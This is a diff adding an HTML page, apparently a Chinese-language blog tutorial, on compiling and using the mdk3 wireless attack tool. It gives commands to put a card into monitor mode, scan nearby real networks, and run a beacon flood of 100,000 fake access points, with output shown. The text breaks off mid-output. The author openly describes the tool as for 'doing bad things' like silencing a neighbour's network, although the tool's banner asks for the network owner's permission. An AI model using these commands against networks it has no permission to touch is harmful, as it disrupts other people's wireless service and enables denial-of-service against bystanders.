@@ -1,0 +1,1094 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>mdk3无线攻击工具的使用</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="mdk3-">mdk3无线攻击工具的使用</h1>
+<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
+<h2 id="0x00-">0x00 简单介绍</h2>
+<p>用来干坏事的，隔壁打撸什么的，mdk3一开，一会儿工夫妥妥的安静</p>
+<h2 id="0x01-">0x01 安装</h2>
+<p>mdk3的官方安装包比较难找</p>
+<pre><code>http://git.kali.org/gitweb/?p=packages/fruitywifi-module-mdk3.git;a=summary
+</code></pre><p>git克隆到本地</p>
+<pre><code>root@tot0c:/home/wnagzihxain/tools# git clone git://git.kali.org/packages/fruitywifi-module-mdk3.git
+</code></pre><p>直接make可能报错，需要修改，把<code>-lpthread</code>改为<code>-pthread</code></p>
+<pre><code>root@tot0c:/home/wnagzihxain/tools/mdk3# nano Makefile
+</code></pre><p>然后make</p>
+<pre><code>root@tot0c:/home/wnagzihxain/tools/mdk3# make
+make -C osdep
+make[1]: Entering directory &#39;/home/wnagzihxain/tools/mdk3/osdep&#39;
+Building for Linux
+make[2]: Entering directory &#39;/home/wnagzihxain/tools/mdk3/osdep&#39;
+make[2]: &#39;.os.Linux&#39; is up to date.
+make[2]: Leaving directory &#39;/home/wnagzihxain/tools/mdk3/osdep&#39;
+make[1]: Leaving directory &#39;/home/wnagzihxain/tools/mdk3/osdep&#39;
+cc -g -O3 -Wall -Wextra -pthread mdk3.c osdep/libosdep.a -o mdk3 -Losdep -losdep
+mdk3.c: In function ‘read_line_from_file’:
+mdk3.c:755:40: warning: passing argument 2 of ‘getline’ from incompatible pointer type [-Wincompatible-pointer-types]
+     bytes_read = getline(&amp;ssid_string, &amp;size, ssid_file_fp);
+                                        ^
+In file included from /usr/include/stdio.h:933:0,
+                 from mdk3.c:28:
+/usr/include/x86_64-linux-gnu/bits/stdio.h:115:1: note: expected ‘size_t * {aka long unsigned int *}’ but argument 
+is of type ‘unsigned int *’
+ getline (char **__lineptr, size_t *__n, FILE *__stream)
+ ^
+mdk3.c:760:37: warning: passing argument 2 of ‘getline’ from incompatible pointer type [-Wincompatible-pointer-types]
+  bytes_read = getline(&amp;ssid_string, &amp;size, ssid_file_fp);
+                                     ^
+In file included from /usr/include/stdio.h:933:0,
+                 from mdk3.c:28:
+/usr/include/x86_64-linux-gnu/bits/stdio.h:115:1: note: expected ‘size_t * {aka long unsigned int *}’ 
+but argument is of type ‘unsigned int *’
+ getline (char **__lineptr, size_t *__n, FILE *__stream)
+ ^
+mdk3.c: In function ‘bruteforce_ssid’:
+mdk3.c:809:32: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+  if (brute_ssid[ssid_len-1] == (int) NULL) {
+                                ^
+mdk3.c:828:32: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+  if (brute_ssid[ssid_len-1] == (int) NULL) {
+                                ^
+mdk3.c:847:32: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+  if (brute_ssid[ssid_len-1] == (int) NULL) {
+                                ^
+mdk3.c:866:32: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+  if (brute_ssid[ssid_len-1] == (int) NULL) {
+                                ^
+mdk3.c:888:32: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+  if (brute_ssid[ssid_len-1] == (int) NULL) {
+                                ^
+mdk3.c:913:32: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+  if (brute_ssid[ssid_len-1] == (int) NULL) {
+                                ^
+mdk3.c: In function ‘ssid_brute_sniffer’:
+mdk3.c:1512:9: warning: variable ‘len’ set but not used [-Wunused-but-set-variable]
+     int len=0;
+         ^
+mdk3.c: In function ‘mac_bruteforce_sniffer’:
+mdk3.c:1926:9: warning: variable ‘plen’ set but not used [-Wunused-but-set-variable]
+     int plen = 0;
+         ^
+mdk3.c: In function ‘eapol_machine’:
+mdk3.c:2560:17: warning: variable ‘len’ set but not used [-Wunused-but-set-variable]
+   int co, flag, len;
+                 ^
+mdk3.c: In function ‘check_probe’:
+mdk3.c:3153:9: warning: variable ‘len’ set but not used [-Wunused-but-set-variable]
+     int len = 0;
+         ^
+mdk3.c: In function ‘mdk_parser’:
+mdk3.c:3393:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_head);
+         ^
+mdk3.c:3409:17: warning: format not a string literal and no format arguments [-Wformat-security]
+   else { printf(use_beac); return -1; }
+                 ^
+mdk3.c:3413:17: warning: format not a string literal and no format arguments [-Wformat-security]
+   else { printf(use_beac); return -1; }
+                 ^
+mdk3.c:3431:16: warning: logical not is only applied to the left hand side of comparison [-Wlogical-not-parentheses]
+     if (! argc &gt; t+1) { printf(use_auth); return -1; }
+                ^
+mdk3.c:3431:32: warning: format not a string literal and no format arguments [-Wformat-security]
+     if (! argc &gt; t+1) { printf(use_auth); return -1; }
+                                ^
+mdk3.c:3436:16: warning: logical not is only applied to the left hand side of comparison [-Wlogical-not-parentheses]
+     if (! argc &gt; t+1) { printf(use_auth); return -1; }
+                ^
+mdk3.c:3436:32: warning: format not a string literal and no format arguments [-Wformat-security]
+     if (! argc &gt; t+1) { printf(use_auth); return -1; }
+                                ^
+mdk3.c:3494:14: warning: logical not is only applied to the left hand side of comparison [-Wlogical-not-parentheses]
+   if (! argc &gt; t+1) { printf(use_prob); return -1; }
+              ^
+mdk3.c:3494:30: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (! argc &gt; t+1) { printf(use_prob); return -1; }
+                              ^
+mdk3.c:3535:32: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (! (argc &gt; t+1)) { printf(use_mich); return -1; }
+                                ^
+mdk3.c:3555:32: warning: format not a string literal and no format arguments [-Wformat-security]
+         if (argc &lt; 4) { printf(use_eapo); return -1; }
+                                ^
+mdk3.c:3565:44: warning: format not a string literal and no format arguments [-Wformat-security]
+               if (! (argc &gt; t+1)) { printf(use_eapo); return -1; }
+                                            ^
+mdk3.c:3569:32: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (! (argc &gt; t+1)) { printf(use_eapo); return -1; }
+                                ^
+mdk3.c:3574:32: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (! (argc &gt; t+1)) { printf(use_eapo); return -1; }
+                                ^
+mdk3.c:3602:29: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (wblist != 0) { printf(use_deau); return -1; }
+                             ^
+mdk3.c:3608:29: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (wblist != 0) { printf(use_deau); return -1; }
+                             ^
+mdk3.c:3630:32: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (! (argc &gt; t+1)) { printf(use_macb); return -1; }
+                                ^
+mdk3.c:3636:32: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (! (argc &gt; t+1)) { printf(use_macb); return -1; }
+                                ^
+mdk3.c:3640:32: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (! (argc &gt; t+1)) { printf(use_macb); return -1; }
+                                ^
+mdk3.c:3655:32: warning: format not a string literal and no format arguments [-Wformat-security]
+   if (! (argc &gt; t+1)) { printf(use_wpad); return -1; }
+                                ^
+mdk3.c:3663:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_head);
+         ^
+mdk3.c:3672:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_wids);
+         ^
+mdk3.c: In function ‘main’:
+mdk3.c:3855:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_head);
+         ^
+mdk3.c:3862:13: warning: format not a string literal and no format arguments [-Wformat-security]
+      printf(use_head);
+             ^
+mdk3.c:3868:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_beac);
+          ^
+mdk3.c:3871:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_auth);
+          ^
+mdk3.c:3874:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_prob);
+          ^
+mdk3.c:3877:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_deau);
+          ^
+mdk3.c:3880:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_mich);
+          ^
+mdk3.c:3883:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_eapo);
+          ^
+mdk3.c:3886:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_wids);
+          ^
+mdk3.c:3889:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_macb);
+          ^
+mdk3.c:3892:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_wpad);
+          ^
+mdk3.c:3895:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(use_head);
+          ^
+mdk3.c:3902:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_head);
+         ^
+mdk3.c:3904:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_beac);
+         ^
+mdk3.c:3905:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_auth);
+         ^
+mdk3.c:3906:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_prob);
+         ^
+mdk3.c:3907:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_deau);
+         ^
+mdk3.c:3908:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_mich);
+         ^
+mdk3.c:3909:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_eapo);
+         ^
+mdk3.c:3910:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_wids);
+         ^
+mdk3.c:3911:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_macb);
+         ^
+mdk3.c:3912:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(use_wpad);
+         ^
+mdk3.c:3931:5: warning: ignoring return value of ‘setuid’, declared with attribute warn_unused_result [-Wunused-result]
+     setuid( getuid() );
+     ^
+</code></pre><p>然后install</p>
+<pre><code>root@tot0c:/home/wnagzihxain/tools/mdk3# make install
+make -C osdep install
+make[1]: Entering directory &#39;/home/wnagzihxain/tools/mdk3/osdep&#39;
+Building for Linux
+make[2]: Entering directory &#39;/home/wnagzihxain/tools/mdk3/osdep&#39;
+make[2]: &#39;.os.Linux&#39; is up to date.
+make[2]: Leaving directory &#39;/home/wnagzihxain/tools/mdk3/osdep&#39;
+make[1]: Leaving directory &#39;/home/wnagzihxain/tools/mdk3/osdep&#39;
+install -D -m 0755 mdk3 //usr/local/sbin/mdk3
+</code></pre><h2 id="0x02-">0x02 使用</h2>
+<p>安装完后执行一下</p>
+<pre><code>root@tot0c:/home/wnagzihxain/tools/mdk3# mdk3
+
+MDK 3.0 v6 - &quot;Yeah, well, whatever&quot;
+by ASPj of k2wrlz, using the osdep library from aircrack-ng
+And with lots of help from the great aircrack-ng community:
+Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
+telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
+THANK YOU!
+
+MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
+IMPORTANT: It is your responsibility to make sure you have permission from the
+network owner before running MDK against it.
+
+This code is licenced under the GPLv2
+
+MDK USAGE:
+mdk3 &lt;interface&gt; &lt;test_mode&gt; [test_options]
+
+Try mdk3 --fullhelp for all test options
+Try mdk3 --help &lt;test_mode&gt; for info about one test only
+
+TEST MODES:
+b   - Beacon Flood Mode
+      Sends beacon frames to show fake APs at clients.
+      This can sometimes crash network scanners and even drivers!
+a   - Authentication DoS mode
+      Sends authentication frames to all APs found in range.
+      Too much clients freeze or reset some APs.
+p   - Basic probing and ESSID Bruteforce mode
+      Probes AP and check for answer, useful for checking if SSID has
+      been correctly decloaked or if AP is in your adaptors sending range
+      SSID Bruteforcing is also possible with this test mode.
+d   - Deauthentication / Disassociation Amok Mode
+      Kicks everybody found from AP
+m   - Michael shutdown exploitation (TKIP)
+      Cancels all traffic continuously
+x   - 802.1X tests
+w   - WIDS/WIPS Confusion
+      Confuse/Abuse Intrusion Detection and Prevention Systems
+f   - MAC filter bruteforce mode
+      This test uses a list of known client MAC Adresses and tries to
+      authenticate them to the given AP while dynamically changing
+      its response timeout for best performance. It currently works only
+      on APs who deny an open authentication request properly
+g   - WPA Downgrade test
+      deauthenticates Stations and APs sending WPA encrypted packets.
+      With this test you can check if the sysadmin will try setting his
+      network to WEP or disable encryption.
+</code></pre><p>看得出来模式很多</p>
+<h3 id="-">启动网卡并监听</h3>
+<p>启动</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# airmon-ng start wlx3c46d84ee541
+
+
+Found 6 processes that could cause trouble.
+If airodump-ng, aireplay-ng or airtun-ng stops working after
+a short period of time, you may want to kill (some of) them!
+
+PID    Name
+1074    avahi-daemon
+1093    NetworkManager
+1171    avahi-daemon
+1333    dhclient
+17174    wpa_supplicant
+17261    dhclient
+Process with PID 17261 (dhclient) is running on interface wlx3c46d84ee541
+
+
+Interface    Chipset        Driver
+
+wlx3c46d84ee541        Atheros AR9271    ath9k - [phy0]
+                (monitor mode enabled on mon0)
+</code></pre><p>监听</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# airodump-ng mon0
+
+CH 13 ][ Elapsed: 12 s ][ 2016-11-17 14:24         
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 0C:82:68:C8:56:**  -37       33       12    0   1  54e. WPA2 CCMP   PSK  wnagzihxain
+ 08:57:00:7A:C8:**  -55        2        1    0   6  54e. WPA2 CCMP   PSK  yang
+ 50:BD:5F:F9:58:**  -55        0        8    0   5  -1   WPA              &lt;length:  0&gt;
+ 28:2C:B2:C9:DE:**  -59       38        0    0   1  54e. WPA2 CCMP   PSK  &lt;length:  0&gt;
+ 3C:46:D8:75:8E:**  -63        0        0    0  11  54e. WPA2 CCMP   PSK  TP-LINK_758E7D
+ 02:17:7B:38:73:**  -72       22        0    0   1  54e  WPA2 CCMP   MGT  CMCC
+ 78:A1:06:58:81:**  -81       28        0    0   1  54e. WPA2 CCMP   PSK  TP-LINK_588170
+ C0:61:18:5E:62:**  -81       17        0    0   1  54e. WPA2 CCMP   PSK  &lt;length:  0&gt;
+ A8:57:4E:6C:9B:**  -86       16       72   13   1  54e. WPA2 CCMP   PSK  nishidoubi
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+
+ 0C:82:68:C8:56:6E  3C:46:D8:4E:E5:41    0    0 - 0      0       38
+ 0C:82:68:C8:56:6E  C8:25:E1:48:C2:00  -45    0e- 0e     1        9
+ 0C:82:68:C8:56:6E  6C:71:D9:2F:52:6B  -60    0e- 0e     0        4
+ 08:57:00:7A:C8:CA  74:23:44:91:1C:6E   -1    0e- 0      0        1
+ 50:BD:5F:F9:58:EE  D0:25:98:AD:03:14   -1    1e- 0      0        8
+ A8:57:4E:6C:9B:14  74:51:BA:C0:F0:65   -1    1e- 0      0       68
+ A8:57:4E:6C:9B:14  10:F6:81:38:70:2A  -88    5e- 1      0        6
+</code></pre><p>接下来这个窗口可以放一边也可以<code>Ctrl+C</code>关闭</p>
+<h3 id="2-1-b-beacon-flood-mode">2.1 b - Beacon Flood Mode</h3>
+<p>这个模式用于生成大量的AP</p>
+<pre><code>b   - Beacon Flood Mode
+      Sends beacon frames to show fake APs at clients.
+      This can sometimes crash network scanners and even drivers!
+</code></pre><p>help</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help b
+b   - Beacon Flood Mode
+      Sends beacon frames to show fake APs at clients.
+      This can sometimes crash network scanners and even drivers!
+      OPTIONS:
+      -n &lt;ssid&gt;                        //自定义SSID
+         Use SSID &lt;ssid&gt; instead of randomly generated ones
+      -f &lt;filename&gt;                    //从文件中读取SSID
+         Read SSIDs from file
+      -v &lt;filename&gt;                    //从文件中读取MAC和SSID
+         Read MACs and SSIDs from file. See example file!
+      -d                               //自定义为Ad-Hoc模式
+         Show station as Ad-Hoc
+      -w                               //自定义为wep模式
+         Set WEP bit (Generates encrypted networks)
+      -g                               //自定义为54 Mbit模式
+         Show station as 54 Mbit
+      -t                               //自定义TKIP加密方式
+         Show station using WPA TKIP encryption
+      -a                               //自定义AES加密方式
+         Show station using WPA AES encryption
+      -m
+         Use valid accesspoint MAC from OUI database
+      -h
+         Hop to channel where AP is spoofed
+         This makes the test more effective against some devices/drivers
+         But it reduces packet rate due to channel hopping.
+      -c &lt;chan&gt;                        //自定义信道
+         Fake an AP on channel &lt;chan&gt;. If you want your card to hop on
+         this channel, you have to set -h option, too!
+      -s &lt;pps&gt;                        //自定义发包速率
+         Set speed in packets per second (Default: 50)
+</code></pre><p>一般来说这个模式我们不需要太多的参数，关于AP名字可以写个程序生成，也可以随机，包括速度这些都可以默认</p>
+<p>比如自定义AP名字，我们写个小程序来批量生成</p>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;cstdio&gt;
+using namespace std;
+
+int main(int argc, char const *argv[])
+{
+    freopen(&quot;AP-name-out&quot;, &quot;w&quot;, stdout);
+    for(int i = 1; i &lt;= 100000; i++)
+        printf(&quot;haha-%d\n&quot;, i);
+    return 0;
+}
+</code></pre><p>执行，TKIP加密，信道6，发包速率100，再看宿主机的WiFi列表，可以看到效果还是不错的</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 mon0 b -f tools/mdk3/AP-name-out -t -c 6 -t 100 
+
+Current MAC: 67:C6:69:73:51:FF on Channel  6 with SSID: haha-1
+Current MAC: FD:82:4E:A9:08:70 on Channel  6 with SSID: haha-43
+Current MAC: EA:7E:64:FF:81:EB on Channel  6 with SSID: haha-103
+Current MAC: 41:9F:18:22:A8:4B on Channel  6 with SSID: haha-163
+Current MAC: ED:D1:E3:1E:53:87 on Channel  6 with SSID: haha-223
+Current MAC: 89:52:F1:84:CD:71 on Channel  6 with SSID: haha-284
+Current MAC: C9:A2:D9:66:2D:E3 on Channel  6 with SSID: haha-345
+Current MAC: 91:E7:B0:DE:84:73 on Channel  6 with SSID: haha-405
+Current MAC: 30:F9:9C:B6:B8:3B on Channel  6 with SSID: haha-465
+Current MAC: 3D:ED:3E:DD:C9:3D on Channel  6 with SSID: haha-525
+Current MAC: 2F:D7:55:6C:B5:CC on Channel  6 with SSID: haha-586
